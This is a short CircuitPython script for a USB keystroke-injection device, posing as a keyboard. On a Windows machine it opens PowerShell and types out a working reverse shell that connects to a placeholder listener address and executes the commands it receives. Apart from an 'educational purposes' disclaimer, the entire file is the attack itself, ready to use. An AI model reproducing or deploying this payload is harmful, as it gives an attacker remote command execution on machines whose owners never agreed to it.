#Disclaimer: For educational purposes only. Do not use for illegal or harmful activities. Only use in controlled environments and comply with all laws.
#PS You will need to setup a listener to get this to work.
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

# Short delay before starting
time.sleep(0.5)

# Open Run dialog
keyboard.press(Keycode.WINDOWS)
keyboard.press(Keycode.R)
keyboard.release_all()

time.sleep(1)

# Open PowerShell
layout.write("powershell")
keyboard.press(Keycode.ENTER)
keyboard.release_all()

time.sleep(1.5)

# Reverse shell payload (replace IP and port accordingly)
payload = (
    "$client = New-Object System.Net.Sockets.TCPClient('PlaceListenerIpHere',PortHere);"
    "$stream = $client.GetStream();"
    "[byte[]]$bytes = 0..65535|%{0};"
    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
    "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
    "$sendback = (iex $data 2>&1 | Out-String );"
    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
    "$stream.Write($sendbyte,0,$sendbyte.Length);"
    "$stream.Flush()}"
)

# Write the payload
layout.write(payload)

# Execute it
keyboard.press(Keycode.ENTER)
keyboard.release_all()
